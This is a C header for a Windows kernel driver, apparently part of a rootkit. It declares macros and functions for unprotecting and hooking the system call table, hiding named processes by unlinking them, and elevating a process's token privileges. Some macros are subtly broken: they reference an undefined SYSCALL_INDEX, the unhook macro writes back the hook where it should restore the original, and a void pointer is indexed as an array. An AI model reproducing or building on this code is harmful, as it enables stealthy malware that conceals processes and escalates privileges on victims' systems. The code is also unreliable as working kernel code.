#ifndef _helpers_h_
#define _helpers_h_

#ifdef __cplusplus
extern "C" 
{
#endif
#include <ntddk.h>
#include <ntddstor.h>
#include <mountdev.h>
#include <ntddvol.h>
#ifdef __cplusplus
}
#endif

extern PVOID MappedSystemCallTable;
extern PMDL pmdlSystemCall;
NTSTATUS HlpUnprotectSSDT();
#define HlpSYSTEMSERVICE(_func) \
	KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_func+1)]
#define HlpSYSCALL_INDEX(_func) *(PULONG)((PUCHAR)_func+1)
#define HlpHOOK_SYSCALL(_func, _hook, _orig ) \
	_orig = (PVOID) InterlockedExchange( (PLONG) \
	&MappedSystemCallTable[SYSCALL_INDEX(_func)], (LONG) _hook)
#define HlpUNHOOK_SYSCALL(_func, _hook, _orig ) \
	InterlockedExchange((PLONG) \
	&MappedSystemCallTable[SYSCALL_INDEX(_func)], (LONG) _hook)

#define SYSNAME "System"
ULONG HlpGetProcNameOffset();
void HlpGetCurrProcName(char *Name);

PEPROCESS HlpFindProcess(char *name, ULONG sz);
PLIST_ENTRY HlpHideProcess(char *name, ULONG sz);
void HlpRestoreProcess(PLIST_ENTRY list);

typedef struct {
	ULONG lo;
	ULONG hi;
} HLPPROCTOKEN;
HLPPROCTOKEN HlpGetCurrProcToken();
HLPPROCTOKEN HlpElevateProcess(char *name, ULONG sz, HLPPROCTOKEN *elvTo);

typedef struct {
	ULONG check;
	ULONG size;
	PVOID buffer;
	PVOID next;
} responseInfo;
void HlpAddResponse(responseInfo *pRespInfo);
responseInfo* HlpFindResponse(ULONG check);

#pragma pack(1)
typedef struct {
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase; //Used only in checked build
	unsigned int NumberOfServices;
	unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry, *PServiceDescriptorTableEntry;
#pragma pack()
extern "C"
{
	__declspec(dllimport) void KeAttachProcess(void *);
	__declspec(dllimport) void KeDetachProcess();
	__declspec(dllimport) ServiceDescriptorTableEntry KeServiceDescriptorTable;
}

#endif //_helpers_h_
